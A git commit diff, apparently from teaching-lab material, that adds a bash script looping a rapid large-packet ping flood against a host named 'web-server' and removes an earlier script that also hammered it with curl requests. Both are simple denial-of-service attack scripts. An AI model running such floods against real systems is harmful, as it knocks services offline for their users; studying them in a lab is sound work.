b6291c2a5cc457d567287716212f83a93008a742
liranmatcu <l.ma@tcu.edu>
2019-04-07 21:03:22 -0500

    dos changes

---
+++ dos_attacks/attacker/dos-attacks-ping.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+while true
+	do
+		ping  web-server  -i 0.001 -s 1500
+	 	# sleep 5
+	done
+exit 0
--- dos_attacks/attacker/dos-attacks.sh
+++
@@ -1,9 +0,0 @@
-#!/bin/bash
-while true
-do
- #Please use 'man curl' to see what -vk is for, also -X command can be useful too.
- curl -vk web-server
- ping  web-server  -i 0.001 -s 1500
- #sleep 5
-done
-exit 0
